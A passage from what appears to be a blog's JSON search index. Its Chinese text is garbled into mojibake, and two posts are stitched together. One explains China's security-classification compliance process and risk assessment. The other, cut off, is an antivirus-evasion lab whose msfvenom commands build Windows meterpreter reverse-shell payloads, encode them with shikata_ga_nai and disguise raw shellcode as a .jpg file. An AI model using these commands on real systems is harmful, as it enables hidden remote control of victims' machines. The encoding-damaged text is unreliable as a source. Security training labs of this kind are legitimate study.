ç­‰çº§ä¿æŠ¤å¯¹è±¡å—åˆ°ç ´ååï¼Œ ä¼šå¯¹å›½å®¶å®‰å…¨é€ æˆç‰¹åˆ«ä¸¥é‡ æŸå®³ã€‚ ç•¥ 1.6 ç­‰çº§ä¿æŠ¤è§’è‰²\u0026amp;èŒè´£ ç­‰çº§ä¿æŠ¤ç®¡ç†éƒ¨é—¨ï¼š ç­‰çº§ä¿æŠ¤ç®¡ç†éƒ¨é—¨ä¾ç…§ç­‰çº§ä¿æŠ¤ç›¸å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šï¼Œåœ¨å„è‡ªèŒè´£èŒƒå›´å†…è´Ÿè´£ç½‘ç»œå®‰å…¨ä¿æŠ¤å’Œç›‘ç£ç®¡ç†å·¥ä½œã€‚å¦‚ï¼šå…¬å®‰æœºå…³ã€å›½å®¶ä¿å¯†å±€ã€å›½å®¶å¯†ç å±€ç­‰ï¼›\nä¸»ç®¡éƒ¨é—¨ï¼š è´Ÿè´£ä¾ç…§å›½å®¶ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤çš„ç®¡ç†è§„èŒƒå’ŒæŠ€æœ¯æ ‡å‡†ï¼Œç£ä¿ƒã€æ£€æŸ¥å’ŒæŒ‡å¯¼æœ¬è¡Œä¸šã€æœ¬éƒ¨é—¨æˆ–è€…æœ¬åœ°åŒºç­‰çº§ä¿æŠ¤å¯¹è±¡è¿è¥ã€ä½¿ç”¨å•ä½çš„ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤å·¥ä½œã€‚ å¦‚ï¼šæ•™è‚²éƒ¨æˆ–è€…æ‰€åœ¨åœ°åŒºçš„æ•™è‚²å±€ï¼›\nè¿è¥ã€ä½¿ç”¨å•ä½ï¼š å°±æ˜¯éœ€è¦åšç­‰ä¿æµ‹è¯„çš„ç›¸å…³å•ä½ï¼Œå¦‚åŒ»é™¢ï¼Œå­¦æ ¡ï¼Œxxç§‘æŠ€å…¬å¸ç­‰ï¼›\nç½‘ç»œå®‰å…¨æœåŠ¡æœºæ„ï¼š å¯ä»¥ååŠ©æµ‹è¯„å¯¹è±¡åšç›¸åº”ç­‰ä¿åŠ¨ä½œçš„ç›¸å…³å•ä½ï¼Œå¦‚ï¼šæ·±ä¿¡æœã€èµ›å¯è¾¾å®éªŒå®¤ã€å›½å®¶è®¡ç®—æœºç½‘ç»œåº”æ€¥æŠ€æœ¯å¤„ç†åè°ƒä¸­å¿ƒç­‰ï¼›\nç½‘ç»œå®‰å…¨ç­‰çº§æµ‹è¯„æœºæ„ï¼š ç­‰ä¿æµ‹è¯„ç»å…¬å®‰éƒ¨è®¤è¯çš„å…·æœ‰èµ„è´¨çš„æµ‹è¯„æœºæ„ï¼Œä¾æ®å›½å®¶ä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤è§„èŒƒè§„å®šï¼Œå—æœ‰å…³å•ä½å§”æ‰˜ï¼ŒæŒ‰ç…§æœ‰å…³ç®¡ç†è§„èŒƒå’ŒæŠ€æœ¯æ ‡å‡†ï¼Œå¯¹ä¿¡æ¯ç³»ç»Ÿå®‰å…¨ç­‰çº§ä¿æŠ¤çŠ¶å†µè¿›è¡Œæ£€æµ‹è¯„ä¼°çš„æ´»åŠ¨ã€‚ç®€å•ç†è§£ä¸ºå…¬å®‰éƒ¨æˆæƒçš„å¯ä»¥å¯¹æµ‹è¯„å¯¹è±¡å‘æ”¾è¯ä¹¦çš„å•ä½ï¼Œå¦‚æœæƒ³æŸ¥è¯¢å…·å¤‡ç­‰ä¿æµ‹è¯„èµ„è´¨çš„å‚å•†ï¼Œå¯ä»¥è®¿é—®ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤ç½‘ï¼Œåœ¨ä¿¡æ¯æŸ¥è¯¢æ ç›®ä¸­ï¼Œç‚¹å‡»å…¨å›½ç½‘ç»œå®‰å…¨ç­‰çº§æµ‹è¯„ä¸æ£€æµ‹è¯„ä¼°æœºæ„ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°å„çœå¸‚çš„æµ‹è¯„æœºæ„åå•å’Œè”ç³»æ–¹å¼ã€‚\nç½‘ç»œå®‰å…¨äº§å“ä¾›åº”å•†ï¼š æä¾›ç›¸å…³å®‰å…¨äº§å“çš„å‚å•†ï¼Œå¦‚ï¼š360ã€æ·±ä¿¡æœã€å¤©èä¿¡ã€å¯æ˜æ˜Ÿè¾°ã€ç»¿ç›Ÿç­‰ï¼›\n1.7 ç­‰çº§ä¿æŠ¤è§„å®šåŠ¨ä½œ å®šçº§ï¼š è‡ªä¸»å®šçº§ã€ä¸“å®¶è¯„å®¡ã€ä¸»ç®¡éƒ¨é—¨å®¡æ‰¹ã€å…¬å®‰æœºå…³å®¡æ ¸ç›‘ç£ã€‚\nå¤‡æ¡ˆï¼š å®šçº§å·¥ä½œå®Œæˆåï¼Œç»è¿‡ä¸“å®¶è¯„å®¡ã€è¡Œä¸šä¸»ç®¡éƒ¨é—¨å®¡æ ¸åï¼ŒæŠ¥é€æ‰€åœ¨åœ°å…¬å®‰æœºå…³è¿›è¡Œå¤‡æ¡ˆã€‚\nå®‰å…¨å»ºè®¾æˆ–æ•´æ”¹ï¼š ä¿¡æ¯ç³»ç»Ÿçš„å®‰å…¨ä¿æŠ¤ç­‰çº§ç¡®å®šåï¼Œè¿è¥ã€ä½¿ç”¨å•ä½åº”å½“æŒ‰ç…§å›½å®¶ä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤ç®¡ç†è§„èŒƒå’ŒæŠ€æœ¯æ ‡å‡†ï¼Œä½¿ç”¨ç¬¦åˆå›½å®¶æœ‰å…³è§„å®šï¼Œæ»¡è¶³ä¿¡æ¯ç³»ç»Ÿå®‰å…¨ä¿æŠ¤ç­‰çº§éœ€æ±‚çš„ä¿¡æ¯æŠ€æœ¯äº§å“ï¼Œå¼€å±•ä¿¡æ¯ç³»ç»Ÿå®‰å…¨å»ºè®¾æˆ–è€…æ”¹å»ºå·¥ä½œã€‚\nç­‰çº§æµ‹è¯„ï¼š ä¿¡æ¯ç³»ç»Ÿå»ºè®¾å®Œæˆåï¼Œè¿è¥ã€ä½¿ç”¨å•ä½æˆ–è€…å…¶ä¸»ç®¡éƒ¨é—¨åº”å½“é€‰æ‹©ç¬¦åˆæœ¬åŠæ³•è§„å®šæ¡ä»¶çš„æµ‹è¯„æœºæ„ï¼Œä¾æ®ã€Šä¿¡æ¯ç³»ç»Ÿå®‰å…¨ç­‰çº§ä¿æŠ¤æµ‹è¯„è¦æ±‚ã€‹ç­‰æŠ€æœ¯æ ‡å‡†ï¼Œå®šæœŸå¯¹ä¿¡æ¯ç³»ç»Ÿå®‰å…¨ç­‰çº§çŠ¶å†µå¼€å±•ç­‰çº§æµ‹è¯„ã€‚\nç›‘ç£æ£€æŸ¥ï¼š ä¿¡æ¯ç³»ç»Ÿè¿è¥ã€ä½¿ç”¨å•ä½åŠå…¶ä¸»ç®¡éƒ¨é—¨å®šæœŸå¯¹ä¿¡æ¯ç³»ç»Ÿå®‰å…¨çŠ¶å†µã€å®‰å…¨ä¿æŠ¤åˆ¶åº¦åŠæªæ–½çš„è½å®æƒ…å†µè¿›è¡Œè‡ªæŸ¥ã€‚å—ç†å¤‡æ¡ˆçš„å…¬å®‰æœºå…³å®šæœŸå¯¹å¤‡æ¡ˆç³»ç»Ÿçš„ç­‰çº§ä¿æŠ¤å·¥ä½œæƒ…å†µè¿›è¡Œæ£€æŸ¥ï¼Œè‹¥å­˜åœ¨è¿è§„é¡¹ï¼Œä¸‹å‘æ•´æ”¹é€šçŸ¥ï¼Œå¿…è¦æ—¶ä¼šé‡‡å–è§„å®šå¤„ç½šæªæ–½ã€‚\n1.8 åŸºæœ¬å®æ–½æµç¨‹ ç³»ç»Ÿå®šçº§ï¼š ä¿¡æ¯ç³»ç»Ÿè¿è¥ä½¿ç”¨å•ä½æˆ–ä¸»ç®¡éƒ¨é—¨æŒ‰ç…§ã€Šä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤ç®¡ç†åŠæ³•ã€‹å’Œã€Šç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤å®šçº§æŒ‡å—ã€‹ï¼Œåˆæ­¥ç¡®å®šå®šçº§å¯¹è±¡çš„å®‰å…¨ä¿æŠ¤ç­‰çº§ï¼Œèµ·è‰ã€Šç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤å®šçº§æŠ¥å‘Šã€‹ï¼›äºŒçº§ä»¥ä¸Šç³»ç»Ÿï¼Œå®šçº§ç»“è®ºéœ€è¦è¿›è¡Œä¸“å®¶è¯„å®¡ã€ä¸»ç®¡éƒ¨é—¨å®¡æ ¸å’Œå¤‡æ¡ˆã€‚ ç³»ç»Ÿå¤‡æ¡ˆï¼š ä¿¡æ¯ç³»ç»Ÿå®‰å…¨ä¿æŠ¤ç­‰çº§ä¸ºç¬¬äºŒçº§ä»¥ä¸Šæ—¶ï¼Œå¤‡æ¡ˆæ—¶åº”å½“æäº¤ã€Šç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤å¤‡æ¡ˆè¡¨ã€‹å’Œå®šçº§æŠ¥å‘Šï¼›ç¬¬ä¸‰çº§ä»¥ä¸Šç³»ç»Ÿï¼Œè¿˜éœ€æäº¤ä¸“å®¶è¯„å®¡æ„è§ã€ç³»ç»Ÿæ‹“æ‰‘å’Œè¯´æ˜ã€å®‰å…¨ç®¡ç†åˆ¶åº¦ã€å®‰å…¨å»ºè®¾æ–¹æ¡ˆç­‰ã€‚å…¬å®‰æœºå…³ä¸€èˆ¬ä¼šåœ¨10æ—¥å†…ç»™äºˆåé¦ˆï¼Œå¦‚æœå¤‡æ¡ˆé€šè¿‡ï¼Œä¼šå‘æ”¾å¤‡æ¡ˆè¯æ˜ï¼›å¦‚æœå¤‡æ¡ˆä¸é€šè¿‡ï¼Œéœ€è¦é‡æ–°å®šçº§ã€‚ ç³»ç»Ÿåˆæµ‹ï¼š æµ‹è¯„æœºæ„æŒ‰ç…§ç®¡ç†è§„èŒƒå’ŒæŠ€æœ¯æ ‡å‡†ï¼Œè¿ç”¨ç§‘å­¦çš„æ‰‹æ®µå’Œæ–¹æ³•ï¼Œå¯¹å¤„ç†ç‰¹å®šåº”ç”¨çš„ä¿¡æ¯ç³»ç»Ÿï¼Œé‡‡ç”¨å®‰å…¨æŠ€æœ¯æµ‹è¯„å’Œå®‰å…¨ç®¡ç†æµ‹è¯„æ–¹å¼ï¼Œå¯¹ä¿æŠ¤çŠ¶å†µè¿›è¡Œåˆæ­¥æ£€æµ‹è¯„ä¼°ï¼Œé’ˆå¯¹å®‰å…¨ä¸ç¬¦åˆé¡¹æå‡ºå®‰å…¨æ•´æ”¹å»ºè®®ã€‚ ç­‰ä¿æ•´æ”¹ï¼š ä¾æ®ã€Šç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åŸºæœ¬è¦æ±‚ã€‹ï¼Œåˆ©ç”¨è‡ªæœ‰æˆ–ç¬¬ä¸‰æ–¹çš„å®‰å…¨äº§å“å’Œä¸“å®¶æœåŠ¡ï¼Œå¯¹ä¿¡æ¯ç³»ç»Ÿè¿›è¡Œå®‰å…¨å»ºè®¾å’Œæ•´æ”¹ï¼ŒåŒæ—¶åˆ¶å®šç›¸åº”çš„å®‰å…¨ç®¡ç†åˆ¶åº¦ã€‚æ•´æ”¹ä¸»è¦åˆ†ä¸ºç®¡ç†æ•´æ”¹å’ŒæŠ€æœ¯æ•´æ”¹ã€‚ å¤æµ‹è·å¾—æŠ¥å‘Šï¼š è¿è¥ä½¿ç”¨å•ä½åº”å½“é€‰æ‹©åˆé€‚çš„æµ‹è¯„æœºæ„ï¼Œä¾æ®ã€Šç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤æµ‹è¯„è¦æ±‚ã€‹ç­‰æŠ€æœ¯æ ‡å‡†ï¼Œå®šæœŸå¯¹ä¿¡æ¯ç³»ç»Ÿå®‰å…¨ç­‰çº§çŠ¶å†µå¼€å±•ç­‰çº§æµ‹è¯„ã€‚æµ‹è¯„ç»“è®ºåˆ†ä¸ºä¼˜ï¼ˆ90åˆ†åŠä»¥ä¸Šï¼‰ã€è‰¯ï¼ˆ80åˆ†åŠä»¥ä¸Šï¼‰ã€ä¸­ï¼ˆ70åˆ†åŠä»¥ä¸Šï¼‰ã€å·®ï¼ˆä½äº70åˆ†ï¼‰ï¼Œ70åˆ†ä»¥ä¸Šæ‰ç®—åŸºæœ¬ç¬¦åˆè¦æ±‚ã€‚ ç›‘ç£æ£€æŸ¥ï¼š å‘å½“åœ°å…¬å®‰æœºå…³ç½‘å®‰éƒ¨é—¨æäº¤æµ‹è¯„æŠ¥å‘Šï¼Œé…åˆå®Œæˆå¯¹ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤å®æ–½æƒ…å†µçš„æ£€æŸ¥ã€‚å…¬å®‰æœºå…³åŠå…¶ä»–ç›‘ç®¡éƒ¨é—¨ä¼šåœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œå±¥è¡Œç›¸åº”çš„ç›‘ç®¡ã€å®¡æ ¸å’Œæ£€æŸ¥ç­‰èŒè´£ã€‚ 2 é£é™©è¯„ä¼° ä¿¡æ¯å®‰å…¨é£é™©è¯„ä¼°å°±æ˜¯ä»é£é™©ç®¡ç†è§’åº¦ï¼Œè¿ç”¨ç§‘å­¦çš„æ–¹æ³•å’Œæ‰‹æ®µï¼Œç³»ç»Ÿåœ°åˆ†æä¿¡æ¯ç³»ç»Ÿæ‰€é¢ä¸´çš„å¨èƒåŠå…¶å­˜åœ¨çš„è„†å¼±æ€§ï¼Œè¯„ä¼°å®‰å…¨äº‹ä»¶ä¸€æ—¦å‘ç”Ÿå¯èƒ½é€ æˆçš„å±å®³ç¨‹åº¦ï¼Œæå‡ºæœ‰é’ˆå¯¹æ€§çš„æŠµå¾¡å¨èƒçš„é˜²æŠ¤å¯¹ç­–å’Œæ•´æ”¹æªæ–½ï¼Œä¸ºé˜²èŒƒå’ŒåŒ–è§£ä¿¡æ¯å®‰å…¨é£é™©ï¼Œå°†é£é™©æ§åˆ¶åœ¨å¯æ¥å—çš„æ°´å¹³ï¼Œæœ€å¤§é™åº¦åœ°ä¿éšœä¿¡æ¯å®‰å…¨æä¾›ç§‘å­¦ä¾æ®\n2.1 é£é™©è¯„ä¼°å‡†å¤‡ ç¡®å®šé£é™©è¯„ä¼°çš„ç›®æ ‡ã€èŒƒå›´ã€æ–¹æ³•ã€æ ‡å‡†å’Œè´£ä»»ï¼› æ”¶é›†é£é™©è¯„ä¼°æ‰€éœ€çš„å†…å¤–éƒ¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬å†å²æ•°æ®å’Œæœªæ¥é¢„æµ‹ï¼› ç­›é€‰ã€æç‚¼ã€å¯¹æ¯”ã€åˆ†ç±»ã€ç»„åˆä¿¡æ¯ï¼Œä»¥ä¾¿è¿›è¡Œé£é™©è¯„ä¼°ã€‚ 2.2 èµ„äº§è¯†åˆ« è¯†åˆ«é£é™©è¯„ä¼°å¯¹è±¡çš„èµ„äº§ï¼ŒåŒ…æ‹¬ç‰©ç†èµ„äº§ã€ä¿¡æ¯èµ„äº§ã€äººåŠ›èµ„äº§ç­‰ï¼› ç¡®å®šèµ„äº§çš„ä»·å€¼ã€é‡è¦æ€§ã€æ•æ„Ÿæ€§ç­‰å±æ€§ï¼› ç¡®å®šèµ„äº§çš„æ‰€æœ‰è€…å’Œä½¿ç”¨è€…ã€‚ 2.3 å¨èƒè¯†åˆ« è¯†åˆ«å¯èƒ½å¯¹èµ„äº§é€ æˆæŸå®³æˆ–å½±å“çš„å¨èƒï¼ŒåŒ…æ‹¬è‡ªç„¶å¨èƒã€äººä¸ºå¨èƒç­‰ï¼› ç¡®å®šå¨èƒçš„æ¥æºã€ç±»å‹ã€é¢‘ç‡ã€å¼ºåº¦ç­‰ç‰¹å¾ï¼› ç¡®å®šå¨èƒå‘ç”Ÿçš„æ¡ä»¶å’Œè§¦å‘å› ç´ ã€‚ 2.4 è„†å¼±æ€§è¯†åˆ« è¯†åˆ«èµ„äº§å­˜åœ¨çš„è„†å¼±æ€§ï¼Œå³å¯èƒ½è¢«å¨èƒåˆ©ç”¨çš„ç¼ºé™·æˆ–æ¼æ´ï¼› ç¡®å®šè„†å¼±æ€§çš„ç¨‹åº¦ã€èŒƒå›´ã€æŒç»­æ—¶é—´ç­‰ç‰¹å¾ï¼› ç¡®å®šè„†å¼±æ€§äº§ç”Ÿçš„åŸå› å’Œå½±å“å› ç´ ã€‚ 2.5 å·²æœ‰å®‰å…¨æªæ–½çš„ç¡®è®¤ ç¡®è®¤å·²ç»é‡‡å–æˆ–è®¡åˆ’é‡‡å–çš„å®‰å…¨æªæ–½ï¼ŒåŒ…æ‹¬æŠ€æœ¯æªæ–½ã€ç®¡ç†æªæ–½ã€æ³•å¾‹æªæ–½ç­‰ï¼› ç¡®å®šå®‰å…¨æªæ–½çš„æœ‰æ•ˆæ€§ã€åˆç†æ€§ã€æˆæœ¬æ•ˆç›Šç­‰å±æ€§ï¼› ç¡®å®šå®‰å…¨æªæ–½å¯¹å¨èƒå’Œè„†å¼±æ€§çš„å½±å“ç¨‹åº¦ã€‚ 2.6 é£é™©åˆ†æå’Œäº¤ä»˜é£é™©è¯„ä¼°è®°å½• åˆ†æé£é™©å‘ç”Ÿçš„å¯èƒ½æ€§å’Œå½±å“ç¨‹åº¦ï¼Œç¡®å®šé£é™©æ°´å¹³ï¼› æ¯”è¾ƒé£é™©æ°´å¹³å’Œé£é™©æ‰¿å—åº¦ï¼Œç¡®å®šé£é™©æ˜¯å¦å¯æ¥å—ï¼› åˆ¶å®šé£é™©åº”å¯¹ç­–ç•¥ï¼ŒåŒ…æ‹¬é£é™©æ‰¿æ‹…ã€è§„é¿ã€è½¬ç§»ã€å‡è½»ç­‰ï¼› ç¼–åˆ¶é£é™©è¯„ä¼°æŠ¥å‘Šï¼Œè®°å½•é£é™©è¯„ä¼°è¿‡ç¨‹å’Œç»“æœï¼Œæå‡ºé£é™©ç®¡ç†å»ºè®®ã€‚ 3 æ€»ç»“ ç­‰çº§ä¿æŠ¤ã€é£é™©è¯„ä¼°å’Œå®‰å…¨æµ‹è¯„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ\nç­‰çº§ä¿æŠ¤æ˜¯æŒ‡å¯¹æ¶‰åŠå›½è®¡æ°‘ç”Ÿçš„ç½‘ç»œå’Œä¿¡æ¯ç³»ç»ŸæŒ‰å…¶é‡è¦ç¨‹åº¦åŠå®é™…å®‰å…¨éœ€æ±‚è¿›è¡Œåˆ†ç­‰çº§ä¿æŠ¤ï¼Œå¯¹ç½‘ç»œå’Œä¿¡æ¯ç³»ç»Ÿä¸­ä½¿ç”¨çš„å®‰å…¨äº§å“å®è¡ŒæŒ‰ç­‰çº§ç®¡ç†ï¼Œå¯¹ç½‘ç»œå’Œä¿¡æ¯ç³»ç»Ÿä¸­å‘ç”Ÿçš„ä¿¡æ¯å®‰å…¨äº‹ä»¶è¿›è¡Œåˆ†ç­‰çº§å“åº”ã€å¤„ç½®ã€‚å®ƒæ˜¯ä¿éšœå›½å®¶ç½‘ç»œå’Œä¿¡æ¯å®‰å…¨çš„åŸºæœ¬åˆ¶åº¦ã€åŸºæœ¬ç­–ç•¥ã€åŸºæœ¬æ–¹æ³•ã€‚ç­‰çº§ä¿æŠ¤çš„æ ¸å¿ƒæ˜¯å¯¹ä¿¡æ¯ç³»ç»Ÿç‰¹åˆ«æ˜¯å¯¹ä¸šåŠ¡åº”ç”¨ç³»ç»Ÿå®‰å…¨åˆ†ç­‰çº§ã€æŒ‰æ ‡å‡†è¿›è¡Œå»ºè®¾ã€ç®¡ç†å’Œç›‘ç£ã€‚å›½å®¶å¯¹ä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤å·¥ä½œè¿ç”¨æ³•å¾‹å’ŒæŠ€æœ¯è§„èŒƒé€çº§åŠ å¼ºç›‘ç®¡åŠ›åº¦ã€‚ é£é™©è¯„ä¼°æ˜¯æŒ‡ï¼Œåœ¨é£é™©äº‹ä»¶å‘ç”Ÿä¹‹å‰æˆ–ä¹‹å(ä½†è¿˜æ²¡æœ‰ç»“æŸ)ï¼Œè¯¥äº‹ä»¶ç»™äººä»¬çš„ç”Ÿæ´»ã€ç”Ÿå‘½ã€è´¢äº§ç­‰å„ä¸ªæ–¹é¢é€ æˆçš„å½±å“å’ŒæŸå¤±çš„å¯èƒ½æ€§è¿›è¡Œé‡åŒ–è¯„ä¼°çš„å·¥ä½œã€‚ä»ä¿¡æ¯å®‰å…¨çš„è§’åº¦æ¥è®²ï¼Œé£é™©è¯„ä¼°æ˜¯å¯¹ä¿¡æ¯èµ„äº§æ‰€é¢ä¸´çš„å¨èƒã€å­˜åœ¨çš„å¼±ç‚¹ã€é€ æˆçš„å½±å“ï¼Œä»¥åŠä¸‰è€…ç»¼åˆä½œç”¨æ‰€å¸¦æ¥é£é™©çš„å¯èƒ½æ€§çš„è¯„ä¼°ã€‚ä½œä¸ºé£é™©ç®¡ç†çš„åŸºç¡€ï¼Œé£é™©è¯„ä¼°æ˜¯ç»„ç»‡ç¡®å®šä¿¡æ¯å®‰å…¨éœ€æ±‚çš„ä¸€ä¸ªé‡è¦é€”å¾„ï¼Œå±äºç»„ç»‡ä¿¡æ¯å®‰å…¨ç®¡ç†ä½“ç³»ç­–åˆ’çš„è¿‡ç¨‹ã€‚ å®‰å…¨æµ‹è¯„æ˜¯æŒ‡æŒ‰ç…§ä¸¥æ ¼çš„ç¨‹åºå¯¹ä¿¡æ¯ç³»ç»Ÿè¿›è¡Œå®‰å…¨èƒ½åŠ›çš„ç»¼åˆæµ‹è¯•è¯„ä¼°æ´»åŠ¨ï¼Œç”±æ­£è§„ã€æ£€éªŒæŠ€æœ¯ä¸°å¯Œä¸”è¢«æ”¿åºœæˆæƒèµ„æ ¼çš„æƒå¨æœºæ„è¿›è¡Œæ£€æŸ¥ï¼Œå¸®åŠ©ç³»ç»Ÿè¿è¡Œå•ä½åˆ†æå•ä½ç›®å‰çš„å®‰å…¨è¿è¡ŒçŠ¶å†µã€æ’æŸ¥å­˜åœ¨çš„å®‰å…¨é—®é¢˜ï¼Œå¹¶æä¾›æ”¹è¿›å»ºè®®é™ä½ç³»ç»Ÿçš„å®‰å…¨é£é™©ã€‚ æ€»ä¹‹ï¼Œç­‰çº§ä¿æŠ¤æ˜¯ä¸€ç§ç®¡ç†åˆ¶åº¦ï¼Œé£é™©è¯„ä¼°æ˜¯ä¸€ç§è¯„ä»·æ–¹æ³•ï¼Œå®‰å…¨æµ‹è¯„æ˜¯ä¸€ç§æµ‹è¯•æ´»åŠ¨ã€‚ä¸‰è€…éƒ½æ˜¯ä¸ºäº†æé«˜ä¿¡æ¯ç³»ç»Ÿçš„å®‰å…¨æ€§èƒ½å’Œé˜²å¾¡èƒ½åŠ›ï¼Œä½†ä¾§é‡ç‚¹å’Œæ‰§è¡Œæ–¹å¼ä¸åŒã€‚\n","permalink":"https://senmer.github.io/zh/posts/tech/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/","summary":"\u003cp\u003eç­‰çº§ä¿æŠ¤\u0026amp;é£é™©è¯„ä¼°ï¼šäº†è§£åŸºæœ¬æµ‹è¯„æµç¨‹ï¼ŒçŸ¥é“å„è§’è‰²å²—ä½åœ¨æµ‹è¯„å·¥ä½œä¸­çš„èŒè´£ï¼Œå­¦ä¹ å›½æ ‡æ–‡ä»¶\u003c/p\u003e","title":"ç­‰çº§ä¿æŠ¤\u0026é£é™©è¯„ä¼°"},{"content":"MSFç¼–ç å™¨ç»“åˆshellcodeåŠ è½½å™¨è¿›è¡Œå…æ€å®éªŒ\n1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ IP kali 6.0.0-kali3-amd64 172.31.5.9 2 åˆ©ç”¨MSFå®ç°å…æ€ å…æ€æŠ€æœ¯ç®€ä»‹ï¼š å…æ€æŠ€æœ¯å…¨ç§°ä¸ºåæ€æ¯’æŠ€æœ¯ï¼Œ Anti-Virus ç®€ç§°â€œå…æ€â€ï¼ŒæŒ‡æ˜¯ä¸€ç§èƒ½ä½¿ç—…æ¯’æœ¨é©¬å…äºè¢«æ€æ¯’è½¯ä»¶æŸ¥æ€çš„æŠ€æœ¯ã€‚å…æ€æŠ€æœ¯çš„æ¶‰çŒé¢å¹¿æ³›ï¼Œå…¶ä¸­åŒ…å«åæ±‡ç¼–ã€é€†å‘å·¥ç¨‹ã€ç³»ç»Ÿæ¼æ´ç­‰æŠ€æœ¯ï¼Œå†…å®¹åŸºæœ¬ä¸Šéƒ½æ˜¯ä¿®æ”¹ç—…æ¯’ã€æœ¨é©¬çš„å†…å®¹æ”¹å˜ç‰¹å¾ç ï¼Œä»è€Œèº²é¿äº†æ€æ¯’è½¯ä»¶çš„æŸ¥æ€ã€‚\n2.1 æ²¡æœ‰å…æ€çš„æƒ…å†µ ç›´æ¥ç”Ÿæˆä¸€ä¸ªæœ¨é©¬æ–‡ä»¶5555.exe\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.31.5.7 lport=5555 -f exe -o 5555.exe å°†æ­¤æ–‡ä»¶æ‹·è´åˆ°windowsæœºå™¨ï¼ˆå¼€å¯é˜²ç«å¢™ï¼‰ï¼Œä¼šè¢«å‘ç°å¹¶å¤„ç†\nå°†æ­¤æœ¨é©¬æ–‡ä»¶ä¸Šä¼ åˆ°åœ¨çº¿æ£€æµ‹å¹³å°ï¼Œè§‚å¯Ÿåˆ°æ£€æµ‹ç»“æœå¦‚ä¸‹ï¼š\nhttps://www.virustotal.com/gui/home/upload\n2.2 å¯ç”¨MSFè‡ªå¸¦å…æ€åŠŸèƒ½ Meatsploit æ¡†æ¶ä¸‹å…æ€çš„æ–¹å¼ä¹‹ä¸€å°±æ˜¯ä½¿ç”¨MSFç¼–ç å™¨ã€‚å…¶åŠŸèƒ½æ˜¯å¯¹æ”»å‡»è½½è·æ–‡ä»¶è¿›è¡Œé‡æ–°çš„æ’åˆ—ç¼–ç ï¼Œæ”¹å˜å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ä»£ç å½¢çŠ¶ï¼Œé¿å…è¢«æ€è½¯è®¤å‡ºã€‚MSF ç¼–ç å™¨å¯ä»¥å°†åŸå¯æ‰§è¡Œç¨‹åºé‡æ–°ç¼–ç ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶è¿è¡Œåï¼ŒMSF ç¼–ç å™¨ä¼šå°†åŸå§‹ç¨‹åºè§£ç åˆ°å†…å­˜ä¸­å¹¶æ‰§è¡Œã€‚\nç”Ÿæˆä¸€ä¸ªé‡æ–°ç¼–ç åçš„å…æ€ç¨‹åº6666.exe\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.31.5.7 lport=5555 x86/shikata_ga_nai -i 20 -f exe -o 6666.exe å°†æ–‡ä»¶æ‹·è´è‡³windowsåï¼Œå¹¶æ²¡æœ‰è¢«é˜²ç«å¢™æ£€æµ‹åˆ°ã€‚å†æ¬¡ä¸Šä¼ åˆ°åœ¨çº¿æ£€æµ‹å¹³å° https://www.virustotal.com/gui/home/upload\nå¯ä»¥è§‚å¯Ÿåˆ°å…æ€åæ¯”æ²¡æœ‰å…æ€å‰çš„æ•ˆæœæ›´å·®äº†ï¼ˆå®é™…ä¸Šæ˜¯å› ä¸ºå„ä¸ªé˜²ç«å¢™å·²ç»å‡çº§äº†å¯¹è¿™ç§å…æ€æŠ€æœ¯çš„æ£€æµ‹å’Œé˜²æŠ¤ï¼Œå› æ­¤å…æ€åå®é™…ä¸Šæ˜¯å¢åŠ äº†â€œæˆ‘å°±æ˜¯æœ¨é©¬æ–‡ä»¶â€çš„ç‰¹å¾ï¼Œæ›´å®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼‰\n2.3 åˆ©ç”¨shellcodeåŠ è½½å™¨è¿›è¡Œå…æ€ åœ¨æ”»å‡»ä¸­ï¼Œshellcodeæ˜¯ä¸€æ®µç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´çš„æœ‰æ•ˆè´Ÿè½½ï¼Œshellcodeæ˜¯16è¿›åˆ¶çš„æœºå™¨ç ï¼Œä»¥å…¶ç»å¸¸è®©æ”»å‡»è€…è·å¾—shellè€Œå¾—åã€‚shellcodeå¸¸å¸¸ä½¿ç”¨æœºå™¨è¯­è¨€ç¼–å†™ã€‚ å¯åœ¨å¯„å­˜å™¨eipæº¢å‡ºåï¼Œæ”¾å…¥ä¸€æ®µå¯è®©CPUæ‰§è¡Œçš„shellcodeæœºå™¨ç ï¼Œè®©ç”µè„‘å¯ä»¥æ‰§è¡Œæ”»å‡»è€…çš„ä»»æ„æŒ‡ä»¤ã€‚\nå‚è€ƒé“¾æ¥ï¼šç®€è¿°è·å–shellcodeçš„å‡ ç§æ–¹å¼ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\nç”Ÿæˆä¸€ä¸ªshellcodeæ–‡ä»¶crowsec.jpg\nmsfvenom -p windows/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 7 -b \u0026#39;\\x00\u0026#39; lhost=172.31.5.9 lport=7777 -f raw -o crowsec.jpg 